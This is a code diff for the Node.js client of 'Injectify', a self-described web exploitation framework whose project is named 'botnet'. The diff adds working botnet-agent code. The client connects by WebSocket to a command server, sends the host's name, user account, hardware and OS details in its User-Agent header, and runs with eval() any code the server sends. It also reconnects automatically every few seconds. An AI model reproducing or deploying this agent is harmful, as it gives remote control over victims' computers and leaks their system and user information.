@@ -1,13 +1,32 @@
 /**
- * Import libraries
+  _____        _           _   _  __       
+  \_   \_ __  (_) ___  ___| |_(_)/ _|_   _ 
+   / /\/ '_ \ | |/ _ \/ __| __| | |_| | | |
+/\/ /_ | | | || |  __/ (__| |_| |  _| |_| |
+\____/ |_| |_|/ |\___|\___|\__|_|_|  \__, |
+            |__/  https://samdd.me   |__*/
+
+/**
+ * Configuration
  */
-const SockJS = require('sockjs-client')
+let config = {
+    websocket: 'ws://127.0.0.1:3000/i/websocket',//'wss://uder.ml/i/websocket', 
+    debug: true,
+    project: 'botnet', // Injectify project name
+}
+
+/**
+ * Includes
+ */
+const WebSocket = require('ws')
 const chalk = require('chalk')
 const dialog = require('dialog')
+const os = require('os')
+const wmic = require('node-wmic')
 const alert = msg => dialog.info(msg.toString(), ' ')
 
 /**
- * Some global definitions
+ * Global definitions
  */
 global.Buffer = global.Buffer || require('buffer').Buffer
 global.window = global
@@ -20,14 +39,6 @@ if (typeof atob === 'undefined') {
   global.atob = function (b64Encoded) {
     return new Buffer(b64Encoded, 'base64').toString()
   }
-}
-
-/**
- * Configuration
- */
-let config = {
-    websocket: 'https://uder.ml/i', //'http://127.0.0.1:3000/i',
-    project: 'botnet',
 }
 
 /**
@@ -50,10 +61,30 @@ Web exploitation framework for the 21st century.` + chalk.yellowBright(`
  * Websocket handler
  */
 console.log(chalk.greenBright('[Injectify] ') + chalk.yellowBright('connecting to server ') + chalk.magentaBright(config.websocket))
-let i = () => {
-    let ws = new SockJS(
-        `${config.websocket}?$${Buffer.from(config.project).toString('base64')}`
-    )
+let i = pc => {
+    let ws = new WebSocket(
+        `${config.websocket}?${config.debug ? '$' : ''}${Buffer.from(config.project).toString('base64')}`, [], {
+        headers: {
+            'User-Agent': JSON.stringify({
+                client: {
+                    type: 'node'
+                },
+                release: os.release(),
+                arch: os.arch(),
+                type: os.type(),
+                hostname: os.hostname(),
+                cpus: os.cpus(),
+                totalmem: os.totalmem(),
+                freemem: os.freemem(),
+                userInfo: os.userInfo(),
+                platform: os.platform(),
+                uptime: os.uptime(),
+                versions: process.versions,
+                vendor: pc ? pc.Manufacturer : undefined,
+                model: pc ? pc.Product : undefined
+            })
+        }
+    })
 
     let send = (topic, data) => {
         ws.send(
@@ -64,12 +95,16 @@ let i = () => {
         )
     }
 
-    ws.onopen = function() {
+    ws.on('error', e => {
+        console.error(e)
+    })
+
+    ws.onopen = () => {
         console.log(chalk.greenBright('[Injectify] ') + chalk.yellowBright('connected!'))
         send('r', 't')
     }
 
-    ws.onmessage = function(message) {
+    ws.onmessage = message => {
         try {
             message = JSON.parse(message.data)
             eval(message.d)
@@ -82,8 +117,12 @@ let i = () => {
         }
     }
 
-    ws.onclose = function() {
+    ws.onclose = () => {
         setTimeout(i, 3000)
     }
 }
-i()
+wmic.baseboard().then(pc => {
+    i(pc)
+}).catch(() => {
+    i()
+})
